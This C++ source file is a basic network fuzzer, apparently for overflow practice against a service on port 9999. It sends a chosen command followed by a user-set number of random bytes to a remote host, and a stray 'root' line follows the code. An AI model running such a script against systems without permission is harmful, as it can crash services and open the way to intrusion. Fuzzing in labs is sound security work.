#include "Headers.h"

int main(int argc, char** argv){
#if defined(_WIN32)
	WSADATA d;
	if(WSAStartup(MAKEWORD(2,2), &d)){
		printf("[+] Failed to initialize winsock !\n");
		return -1;
	}
#endif
	printf("[+] Which argument would you like to use ? : ");
        std::string argument = {""};
        std::getline(std::cin >> std::ws, argument);
        printf("[+] How much bytes would you like to send ? : ");
        int Bytes2Send;
        std::cin >> Bytes2Send;

	struct addrinfo hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_socktype = SOCK_STREAM;
	struct addrinfo* peer_address;
	if(getaddrinfo(argv[1], argv[2] ? argv[2] : "9999", &hints, &peer_address)){
		printf("[-] Failed getaddrinfo() !");
		return -1;
	}
	char address_buffer[100];
	char service_buffer[100];
	printf("[+] Configuring remote address...\n");
	getnameinfo(peer_address->ai_addr, peer_address->ai_addrlen, address_buffer, sizeof(address_buffer), service_buffer, sizeof(service_buffer), NI_NUMERICHOST);
	printf("[+] Remote address is : %s\n", address_buffer);
	printf("[+] Remote service is : %s\n", service_buffer);
	printf("[+] Creating socket...\n");
	SOCKET socket_peer;
	socket_peer = socket(peer_address->ai_family, peer_address->ai_socktype, peer_address->ai_protocol);
	if(!ISVALIDSOCKET(socket_peer)){
		printf("[-] Socket creation failed...\n");
		return -1;
	}
	printf("[+] Connecting...\n");
	if(connect(socket_peer, peer_address->ai_addr, peer_address->ai_addrlen)){
		printf("[-] Connection to target is impossible !\n");
		return -1;
	}
	freeaddrinfo(peer_address);
	int random;
	char decoded;
	std::string exploitBuffer = argument + " ";
	for(int i=0;i<Bytes2Send;i++){
		random = rand() % 26;
		decoded = 'a' + random;
		exploitBuffer.push_back(decoded);
	}

	//std::cout<<exploitBuffer<<std::endl<<std::endl;
	char* finalExploit = new char[exploitBuffer.size() + 1];
	std::copy(exploitBuffer.begin(), exploitBuffer.end(), finalExploit);
	finalExploit[exploitBuffer.size()] = '\0';
	printf("%s\n", finalExploit);
	int bytes2Send = send(socket_peer, finalExploit, exploitBuffer.size() + 1, 0);
	printf("[+] Sent %d bytes to %s %s\n", bytes2Send, address_buffer, service_buffer);
	CLOSESOCKET(socket_peer);
	printf("[+] Done !\n");
	return 0;

}
root
